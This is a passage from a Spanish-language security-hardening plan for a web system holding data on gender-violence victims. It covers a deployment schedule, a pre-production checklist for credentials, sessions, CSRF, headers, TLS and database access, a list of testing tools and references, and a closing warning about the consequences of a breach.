  - Desplegar en ambiente de pruebas
  - Validar con usuarios
  
- [ ] **Día 5**: Producción
  - Desplegar en producción
  - Monitorear de cerca
  - Plan de rollback listo

---

## 🔍 VERIFICACIÓN DE SEGURIDAD

### Checklist Pre-Producción

#### Credenciales
- [ ] No hay contraseñas en código
- [ ] No hay contraseñas en repositorio Git
- [ ] Variables de entorno configuradas
- [ ] Secretos en gestor seguro (Vault/Secrets Manager)

#### Sesiones
- [ ] `HttpOnly: true`
- [ ] `Secure: true`
- [ ] `SameSite: Strict`
- [ ] Secret key aleatoria de 32+ bytes
- [ ] Sesiones en Redis/DB (no memoria)
- [ ] TTL configurado (4 horas)

#### CSRF
- [ ] Middleware CSRF implementado
- [ ] Tokens en formularios
- [ ] Validación en backend

#### Logging
- [ ] Logging estructurado (Zap/Logrus)
- [ ] No se loggean datos sensibles
- [ ] Logs centralizados
- [ ] Alertas configuradas

#### Rate Limiting
- [ ] Por usuario/IP
- [ ] Límites apropiados
- [ ] Respuestas 429 correctas

#### Headers
- [ ] X-Frame-Options
- [ ] X-Content-Type-Options
- [ ] Content-Security-Policy
- [ ] HSTS
- [ ] Referrer-Policy

#### TLS/SSL
- [ ] Certificados válidos
- [ ] TLS 1.2+ únicamente
- [ ] Redirección HTTP → HTTPS
- [ ] HSTS habilitado

#### Base de Datos
- [ ] Conexiones cifradas
- [ ] Prepared statements (prevenir SQL injection)
- [ ] Principio de mínimo privilegio
- [ ] Backups automáticos

---

## 📞 CONTACTOS Y RECURSOS

### Herramientas de Testing
- **OWASP ZAP**: Pruebas de penetración
- **Burp Suite**: Análisis de seguridad web
- **SecurityHeaders.com**: Verificar headers
- **SSL Labs**: Verificar configuración SSL

### Recursos
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Go Security Checklist](https://github.com/Checkmarx/Go-SCP)
- [ENS (Esquema Nacional de Seguridad)](https://ens.ccn.cni.es/)
- [RGPD](https://www.boe.es/buscar/act.php?id=BOE-A-2018-16673)

---

## ⚠️ ADVERTENCIA FINAL

Este sistema maneja **datos sensibles de víctimas de violencia de género**. Un compromiso de seguridad puede:

1. Exponer identidades de víctimas
2. Poner en riesgo vidas humanas
3. Generar responsabilidad legal
4. Dañar la confianza institucional
5. Violar RGPD y ENS

**Las mejoras de seguridad NO son opcionales. Son OBLIGATORIAS.**

---

**Documento creado:** 23 de febrero de 2026  
**Prioridad:** CRÍTICA  
**Estado:** PENDIENTE DE IMPLEMENTACIÓN  
**Responsable:** Equipo de Desarrollo + CISO
